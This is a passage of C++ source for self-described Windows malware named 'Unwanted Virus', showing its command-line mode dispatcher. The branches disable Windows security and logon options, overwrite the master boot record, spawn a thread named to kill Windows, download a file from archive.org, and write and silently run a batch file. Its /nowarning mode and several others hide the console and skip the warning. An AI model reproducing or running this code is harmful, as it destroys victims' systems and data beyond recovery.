if (!lstrcmpW(argv[1], L"createdesktopfiles")) {
            CreateDesktopFiles(); // Create Desktop Files
            return 0;
        }
        if (!lstrcmpW(argv[1], L"nosettings")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        
        if (!lstrcmpW(argv[1], L"disableWindowsSecurity")) {
            if (MessageBoxW(NULL, L"Windows security will be disable this can be dangerous to your system that means if you press yes everything goes to s³€ð\r\n\r\nTHIS ALSO IS IMPOSSIBLE TO UNDO, PLEASE THINK WHAT ARE YOU GOING TO DO!", NULL, MB_ICONWARNING | MB_YESNO) != IDYES) {
                return -8;
            }
            DisableSecurity();
            return 0;
        }

==========

if (!lstrcmpW(argv[1], L"startmalwarewithlog"))
        {
            MessageBox(NULL, L"Sorry but this mode was only avaliable when this program was developed and when was a CLI program, now this is a WUI program and this is not avaliable, also why a malware just have a log?", L"Log mode", MB_ICONINFORMATION | MB_OK);
            goto warning;
            /*
            SetConsoleTitle(TEXT("Unwanted Virus Console Window"));
            system("cls");
            NoUnwanted1();
            cout << "Unwanted Virus Console Versión [2.0.666.0]\n";
            cout << "(c) BenjaminFretez. Todos los derechos reservados.\n\n";
            cout << "This malware is not ready for be used on this mode, are u sure to continue?[y/n]\n";
            cout << "[ Input ] > ";

            int DisplayResourceNameMessageBox();
            {
                int startmsg = MessageBox(
                    NULL,
                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                    MB_ICONWARNING | MB_YESNO
                );

                switch (startmsg)
                {
                case IDYES:
                    cout << "Y"; Sleep(100); cout << "e"; Sleep(100); cout << "s"; Sleep(100); cout << "  "; Sleep(100); cout << "=";  Sleep(100); cout << ")"; Sleep(100);
                    cout << "\n\n";
                    Sleep(200);
                    goto malware; // run malware
                case IDNO:
                    cout << "N"; Sleep(100); cout << "o"; Sleep(100);
                    cout << "\n\n";
                    Sleep(200);
                    int startmsg = MessageBox(
                        NULL,
                        (LPCWSTR)L"OK, you missed the fun...",
                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                        MB_ICONINFORMATION | MB_OK
                    );
                    NoUnwanted0();
                    break;
                }
                return startmsg;
            }*/

        }
        if (!lstrcmpW(argv[1], L"startonlymsgbox")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window

            MessageBox(
                NULL,
                (LPCWSTR)L"Now you are going to start `startonlymsgbox` mode\nYou can kill all with TaskMgr! =)", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );

            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            while(1){}
        }
        if (!lstrcmpW(argv[1], L"changetext")) {
            if (MessageBoxA(hwnd,
                "unrecommended - continue?",
"Úñåáñþéð ß¾®ü’- 'ctp'", MB_YESNO | MB_ICONWARNING) != IDYES) {
                ExitProcess(0);
            }
            CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);

            MessageBox(
                NULL,
                (LPCWSTR)L"end `changetext`?", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"deskicomov")) {
            CreateThread(NULL, NULL, &payloadThread, &MoveDesktopIcons, NULL, NULL);
            MessageBox(
                NULL,
                (LPCWSTR)L"end `deskicomov`?", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"randbeep")) {
            CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);

            MessageBox(
                NULL,
                (LPCWSTR)L"Click OK for end `randbeep` mode", // Warning message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/about")) {
            cout << "Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0";
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0", // about msgbox
                (LPCWSTR)L"About Unwanted Virus",
                MB_ICONINFORMATION | MB_OK
            );
            return 0;
        }        
        if (!lstrcmpW(argv[1], L"see-iam-alone")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            Sleep(300);
            const wchar_t* UGOTROLLEDL = L"http://archive.org/download/01101000/0000004.bin";
            const wchar_t* UGOTROLLEDD = L"C:\\Program Files\\Common Files\\system\\ugottrolledhaha.png";
            if (S_OK == URLDownloadToFile(NULL, UGOTROLLEDL, UGOTROLLEDD, 0, NULL)) {
                // success
            }
            else // else kills os
            {
                CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
                int DisplayResourceNAMessageBox();
                {
                    int msgboxID = MessageBox(
                        NULL,
                        (LPCWSTR)L"Unknown hard error",
                        (LPCWSTR)L"unwanted.exe - System Warning",
                        MB_ICONWARNING | MB_OK
                    );
                };
                DestroyMBR();

                CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
                CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
                CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
            };

            HANDLE ESCAPE = CreateFileA("C:\\The Escape is behind you", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

            WriteFile(ESCAPE, escapem, escape_len, &wb, NULL);

            CloseHandle(ESCAPE);


            ShellExecuteA(NULL, NULL, "notepad", "C:\\The Escape is behind you", NULL, SW_SHOWDEFAULT);

            Sleep(5000);

            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\ugottrolledhaha.png";
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);

            CreateThread(NULL, NULL, &payloadThread, &Tada, NULL, NULL);

            int msgboxID = MessageBox(
                NULL,
                (LPCWSTR)L"U GOT TROLLED HAHAHA",
                (LPCWSTR)L"HAHAHAHAHAAHAHAHAH",
                NULL | MB_OK
            );

            Sleep(10000);

            return 0;
        } 
        if (!lstrcmpW(argv[1], L"/nowarning")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto malware; // Skips the Warning
        }
        if (!lstrcmpW(argv[1], L"/help")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"/nowarning - Start Malware without warning\n/help - See other command arguments\n/why - Why i did this?\n/about - About this malware\n\nUse you I M A G I N A T I O N", // help message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Hell",
                MB_ICONQUESTION | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/?")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"/nowarning - Start Malware without warning\n/help - See other command arguments\n/why - Why i did this?\n/about - About this malware\n\nUse you I M A G I N A T I O N", // help message box
                (LPCWSTR)L"Úñåáñþéð ß¾®ü’ - Hell",
                MB_ICONQUESTION | MB_OK
            );
            return 0;
        }        
        if (!lstrcmpW(argv[1], L"/why")) {
            ShellExecuteA(NULL, NULL, "http://youtu.be/QbjYksxk4gA", NULL, NULL, SW_SHOWDEFAULT);
            return 0;
        }
        if (!lstrcmpW(argv[1], L"createmiwprogram")) {
            CreateTimeDate();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"/hell")) {
            int startmsg = MessageBox(
                NULL,
                (LPCWSTR)L"H E L L", // hell message box
                (LPCWSTR)L"H E L L",
                MB_ICONERROR | MB_OK
            );
            return 0;
        }
        if (!lstrcmpW(argv[1], L"skipdestroymbr")) { // skip destroy mbr
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"disablelogonoptions")) {
            DisableLogonOptions();
            return 0;
        }
        if (!lstrcmpW(argv[1], L"skiplogonui")){
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto warning;
        }
        if (!lstrcmpW(argv[1], L"experimental")) {
            HANDLE bat = CreateFileA("C:\\Program Files\\Common Files\\system\\Program.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

            WriteFile(bat, batm, bat_len, &wb, NULL);

            CloseHandle(bat);
            cout << "Archivo Creado\n\n";
            Sleep(100);

            ShellExecuteA(NULL, NULL, "cmd", "/c \u0022C:\\Program Files\\Common Files\\system\\Program.bat\u0022", NULL, SW_HIDE);
            cout << "Programa Ejecutado\n\n";
            Sleep(1000);
            ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Program.bat", NULL, SW_SHOWDEFAULT);
            cout << "Notepad abierto\n\n";
            Sleep(1000);


            return 0;
        }
        if (!lstrcmpW(argv[1], L"nomainpayload")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            goto DownloadFiles;
        }
        if (!lstrcmpW(argv[1], L"startmainpayload")) {
            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
            CreateDesktopFiles(); // Create Desktop Files
            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
            /* Main Payload */
            CreateThread(NULL, NULL, &payloadThread, &PlayMusik, NULL, NULL);
            Sleep(1500);
            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "write", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
            Sleep(8500);
            ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(4500);
            CreateThread(NULL, NULL, &payloadThread, &payloadReverseText, NULL, NULL);
            CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Die.txt\u0022", NULL, SW_SHOW);
            Sleep(4500);
            ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(2250);
            ShellExecuteA(NULL, NULL, "explorer", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(2250);
            CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
            ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
            Sleep(2250);
            ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(6000);
            ShellExecuteA(NULL, NULL, "cmd", NULL, NULL, SW_SHOWDEFAULT);
            Sleep(6000);
            ShellExecuteA(NULL, NULL, "notepad", "\u0022C:\\Program Files\\Common Files\\system\\Last.txt\u0022", NULL, SW_SHOW);
            Sleep(6000);
            CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
            CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
            // last 10 seconds (wait until windows dies)
            Sleep(8000);

            //KWI(FOR;;1000)
            Sleep(1000);
            return 0;

        }